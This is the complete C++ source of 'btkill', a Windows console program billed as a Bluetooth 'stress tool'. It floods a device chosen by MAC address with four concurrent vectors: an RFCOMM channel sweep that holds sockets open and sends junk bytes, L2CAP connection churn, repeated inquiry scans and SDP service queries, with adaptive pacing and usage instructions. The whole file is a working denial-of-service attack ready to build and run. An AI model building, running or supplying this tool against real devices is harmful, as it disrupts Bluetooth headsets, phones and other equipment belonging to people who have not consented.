// ============================================================================
//  btkill (Windows) — Bluetooth multi-vector stress tool
//  Vectors: RFCOMM sweep | L2CAP churn | Inquiry storm | SDP flood
//  Hardware detection + adaptive pacing + live stats
//
//  Build: Visual Studio 2019/2022 -> Console App (C++), Release | x64
//  Run as Administrator.
//  Usage: btkill.exe <MAC> [seconds] [threads]
// ============================================================================

#include <winsock2.h>
#include <ws2bth.h>
#include <bthsdpdef.h>
#include <bthdef.h>
#include <bluetoothapis.h>
#include <Windows.h>

#include <cstdio>
#include <cstring>
#include <cstdint>
#include <atomic>
#include <vector>
#include <thread>
#include <chrono>
#include <string>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Bthprops.lib")

static std::atomic<bool>     g_run{true};
static std::atomic<uint64_t> g_ok{0}, g_err{0};
static BTH_ADDR              g_addr = 0;
static std::atomic<int>      g_delay_ms{8};

static BOOL WINAPI ctrl_handler(DWORD t) {
    if (t == CTRL_C_EVENT) { g_run = false; return TRUE; }
    return FALSE;
}

static inline void tick(bool ok) {
    static thread_local uint16_t w_ok = 0, w_all = 0;
    w_ok += ok ? 1 : 0; w_all++;
    if (w_all < 50) return;
    double r = (double)w_ok / w_all;
    int d = g_delay_ms.load();
    if (r > 0.6)      d = max(1,  d - (d > 4 ? d / 4 : 1));
    else if (r < 0.1) d = min(150, d + (d < 40 ? d / 3 + 1 : 4));
    g_delay_ms.store(d);
    w_ok = w_all = 0;
}

static inline void paced() {
    std::this_thread::sleep_for(std::chrono::milliseconds(g_delay_ms.load()));
}

// ---- Hardware detection ----------------------------------------------------
static int detect_radios() {
    HANDLE hRadio = NULL;
    BLUETOOTH_FIND_RADIO_PARAMS prm{};
    prm.dwSize = sizeof(prm);
    HBLUETOOTH_RADIO_FIND hFind = BluetoothFindFirstRadio(&prm, &hRadio);
    int count = 0;
    if (hFind) {
        do {
            count++;
            CloseHandle(hRadio);
        } while (BluetoothFindNextRadio(hFind, &hRadio) && count < 8);
        BluetoothFindRadioClose(hFind);
    }
    return count;
}

static void print_diagnosis(int radio_count, int wsa_err) {
    wprintf(L"\n[!] ================== DIAGNOSIS ==================\n");
    if (wsa_err != 0)
        wprintf(L"[!] Winsock failed to start (error %d)\n", wsa_err);
    if (radio_count == 0) {
        wprintf(L"[!] NO BLUETOOTH ADAPTER DETECTED on this system.\n");
        wprintf(L"[!] Possible causes and fixes:\n");
        wprintf(L"    1. No built-in Bluetooth -> plug a USB dongle (CSR 4.0+)\n");
        wprintf(L"    2. Disabled in BIOS/UEFI -> enable it\n");
        wprintf(L"    3. Off in Windows -> Settings > Bluetooth & devices > ON\n");
        wprintf(L"    4. Driver missing -> Device Manager, run: pnputil /scan-devices\n");
        wprintf(L"    5. VM without USB passthrough -> pass the dongle to the VM\n");
        wprintf(L"    6. Service stopped -> run as admin: net start bthserv\n");
        wprintf(L"[!] Exiting. Fix the issue and run again.\n");
    } else {
        wprintf(L"[*] Found %d Bluetooth radio(s) - OK\n", radio_count);
    }
    wprintf(L"[!] ===============================================\n\n");
}

// ---- Vector 1: RFCOMM sweep -------------------------------------------------
static void vec_rfcomm() {
    int ch = 1;
    std::vector<SOCKET> held;
    const size_t max_held = 12;

    while (g_run) {
        SOCKET s = socket(AF_BTH, SOCK_STREAM, BTHPROTO_RFCOMM);
        if (s == INVALID_SOCKET) { g_err++; tick(false); paced(); continue; }

        SOCKADDR_BTH sa{};
        sa.addressFamily = AF_BTH;
        sa.btAddr        = g_addr;
        sa.port          = (ULONG)ch;
        ch = (ch % 30) + 1;

        u_long nb = 1;
        ioctlsocket(s, FIONBIO, &nb);
        connect(s, (SOCKADDR*)&sa, sizeof(sa));
        Sleep(30);

        fd_set w; FD_ZERO(&w); FD_SET(s, &w);
        struct timeval tv{0, 80000};
        if (select(0, nullptr, &w, nullptr, &tv) > 0) {
            char junk[64];
            memset(junk, 0x41, sizeof(junk));
            if (send(s, junk, sizeof(junk), 0) > 0) { g_ok++; tick(true); }
            else                                    { g_err++; tick(false); }
            if (held.size() < max_held) held.push_back(s);
            else { closesocket(s); held.erase(held.begin()); }
        } else { g_err++; tick(false); closesocket(s); }
        paced();
    }
    for (SOCKET s : held) closesocket(s);
}

// ---- Vector 2: L2CAP churn --------------------------------------------------
static void vec_l2cap() {
    bool warned = false;
    while (g_run) {
        SOCKET s = socket(AF_BTH, SOCK_SEQPACKET, BTHPROTO_L2CAP);
        if (s == INVALID_SOCKET) {
            if (!warned) {
                wprintf(L"[i] L2CAP unavailable on this stack (err %d) - vector disabled\n",
                        WSAGetLastError());
                warned = true;
            }
            Sleep(500);
            continue;
        }

        SOCKADDR_BTH sa{};
        sa.addressFamily = AF_BTH;
        sa.btAddr        = g_addr;
        sa.port          = 0x0001;

        u_long nb = 1;
        ioctlsocket(s, FIONBIO, &nb);
        connect(s, (SOCKADDR*)&sa, sizeof(sa));
        Sleep(20);

        fd_set w; FD_ZERO(&w); FD_SET(s, &w);
        struct timeval tv{0, 60000};
        if (select(0, nullptr, &w, nullptr, &tv) > 0) {
            char junk[128];
            memset(junk, 0x41, sizeof(junk));
            if (send(s, junk, sizeof(junk), 0) > 0) { g_ok++; tick(true); }
            else                                    { g_err++; tick(false); }
        } else { g_err++; tick(false); }
        closesocket(s);
        paced();
    }
}

// ---- Vector 3: Inquiry storm ------------------------------------------------
static void vec_inquiry() {
    while (g_run) {
        BLUETOOTH_DEVICE_SEARCH_PARAMS sp{};
        BLUETOOTH_DEVICE_INFO di{};
        HBLUETOOTH_DEVICE_FIND h;

        di.dwSize = sizeof(di);
        sp.dwSize = sizeof(sp);
        sp.fReturnAuthenticated = TRUE;
        sp.fReturnRemembered    = TRUE;
        sp.fReturnUnknown       = TRUE;
        sp.fReturnConnected     = TRUE;
        sp.fIssueInquiry        = TRUE;
        sp.cTimeoutMultiplier   = 1;
        sp.hRadio               = NULL;

        h = BluetoothFindFirstDevice(&sp, &di);
        if (h) {
            do {
                g_ok++; tick(true);
            } while (g_run && BluetoothFindNextDevice(h, &di) && g_run);
            BluetoothFindDeviceClose(h);
        } else { g_err++; tick(false); }
        paced();
    }
}

// ---- Vector 4: SDP flood ----------------------------------------------------
static void vec_sdp() {
    while (g_run) {
        static const GUID uuids[] = {
            {0x0000110B,0x0000,0x1000,{0x80,0x00,0x00,0x80,0x5F,0x9B,0x34,0xFB}}, // AudioSink
            {0x0000110A,0x0000,0x1000,{0x80,0x00,0x00,0x80,0x5F,0x9B,0x34,0xFB}}, // AudioSource
            {0x0000111F,0x0000,0x1000,{0x80,0x00,0x00,0x80,0x5F,0x9B,0x34,0xFB}}, // HandsFree
            {0x00001108,0x0000,0x1000,{0x80,0x00,0x00,0x80,0x5F,0x9B,0x34,0xFB}}, // Headset
            {0x00001105,0x0000,0x1000,{0x80,0x00,0x00,0x80,0x5F,0x9B,0x34,0xFB}}, // OBEX
        };

        for (const GUID& g : uuids) {
            if (!g_run) break;
            WSAQUERYSETW qs{};
            qs.dwSize           = sizeof(qs);
            qs.lpServiceClassId = (LPGUID)&g;
            qs.dwNameSpace      = NS_BTH;

            HANDLE hLookup = NULL;
            if (WSALookupServiceBeginW(&qs, LUP_CONTAINERS, &hLookup) == 0) {
                char buf[2048];
                DWORD len = sizeof(buf);
                while (g_run &&
                       WSALookupServiceNextW(hLookup, 0, &len,
                                             (LPWSAQUERYSETW)buf) == 0) {
                    g_ok++; tick(true);
                    len = sizeof(buf);
                }
                WSALookupServiceEnd(hLookup);
            } else { g_err++; tick(false); }
            paced();
        }
    }
}

// ---- Stats reporter ----------------------------------------------------------
static void reporter() {
    uint64_t last_ok = 0;
    ULONGLONG last_t = GetTickCount64();
    while (g_run) {
        Sleep(5000);
        ULONGLONG t = GetTickCount64();
        uint64_t ok = g_ok.load(), er = g_err.load();
        double dt = (t - last_t) / 1000.0;
        double rate = dt > 0 ? (ok - last_ok) / dt : 0;
        wprintf(L"[stats] ok=%-9llu err=%-9llu %.0f ops/s delay=%dms\n",
                (unsigned long long)ok, (unsigned long long)er,
                rate, g_delay_ms.load());
        last_ok = ok; last_t = t;
    }
}

// ---- main --------------------------------------------------------------------
int wmain(int argc, wchar_t** argv) {
    if (argc < 2) {
        wprintf(L"=== btkill (Windows) - Bluetooth multi-vector stress tool ===\n\n");
        wprintf(L"Usage: btkill.exe <MAC> [seconds=30] [threads=4]\n");
        wprintf(L"  MAC format: 00:11:22:33:44:55\n");
        wprintf(L"  Get MAC from Settings > Bluetooth & devices (after pairing)\n\n");
        wprintf(L"Example: btkill.exe 00:11:22:33:44:55 60 4\n");
        return 1;
    }

    unsigned int b[6];
    if (swscanf_s(argv[1], L"%02x:%02x:%02x:%02x:%02x:%02x",
                  &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
        wprintf(L"[-] Invalid MAC format. Use: 00:11:22:33:44:55\n");
        return 1;
    }
    ULONGLONG mac = 0;
    for (int i = 0; i < 6; i++) mac = (mac << 8) | b[i];
    g_addr = (BTH_ADDR)mac;

    int seconds = (argc > 2) ? _wtoi(argv[2]) : 30;
    int threads = (argc > 3) ? _wtoi(argv[3]) : 4;
    if (threads > 8) threads = 8;

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    WSADATA wsa;
    int wsa_rc = WSAStartup(MAKEWORD(2, 2), &wsa);

    int radios = (wsa_rc == 0) ? detect_radios() : 0;
    if (radios == 0 || wsa_rc != 0) {
        print_diagnosis(radios, wsa_rc);
        if (wsa_rc == 0) WSACleanup();
        return 2;
    }

    wprintf(L"=== btkill (Windows) ===\n");
    wprintf(L"[*] target=%s  %ds  %d threads + inquiry + SDP\n",
            argv[1], seconds, threads);
    wprintf(L"[*] Ctrl+C to stop\n\n");

    std::vector<std::thread> pool;
    pool.emplace_back(vec_inquiry);
    pool.emplace_back(vec_sdp);
    for (int i = 0; i < threads; i++) {
        if (i % 2 == 0) pool.emplace_back(vec_rfcomm);
        else            pool.emplace_back(vec_l2cap);
    }
    std::thread rep(reporter);

    ULONGLONG t0 = GetTickCount64();
    while (g_run && (GetTickCount64() - t0) < (ULONGLONG)seconds * 1000)
        Sleep(200);

    g_run = false;
    for (auto& t : pool) t.join();
    rep.join();
    WSACleanup();

    wprintf(L"\n=== done: ok=%llu err=%llu ===\n",
            (unsigned long long)g_ok.load(), (unsigned long long)g_err.load());
    return 0;
}